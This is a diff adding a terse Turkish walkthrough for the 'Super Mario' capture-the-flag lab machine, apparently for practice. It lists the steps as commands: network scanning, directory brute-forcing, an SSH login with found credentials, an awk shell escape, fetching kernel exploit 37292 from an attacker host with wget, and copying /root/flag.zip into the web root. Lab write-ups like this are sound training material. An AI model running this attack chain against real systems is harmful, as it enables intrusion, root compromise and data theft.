@@ -1,0 +1,13 @@
+SUPER MARİO MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.110 bulundu.
+2 - nmap -sT -A 192.168.2.110
+3 - gobuster dir -u http://192.168.2.110:8180 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - http://192.168.2.110:8180/vhosts -> mario.supermariohost.local
+5 - nano /etc/hosts -> 192.168.2.110 mario.supermariohost.local
+6 - luigi : luigi1, ssh luigi@192.168.2.110
+7 - awk 'BEGIN{system("/bin/bash")}'
+8 - uname -a
+9 - searchsploit 'linux 3.13.0', searchsploit -m 37292
+10 - wget http://192.168.2.128:8000/37292.c
+11 - cp /root/flag.zip /var/www/html
+12 - 
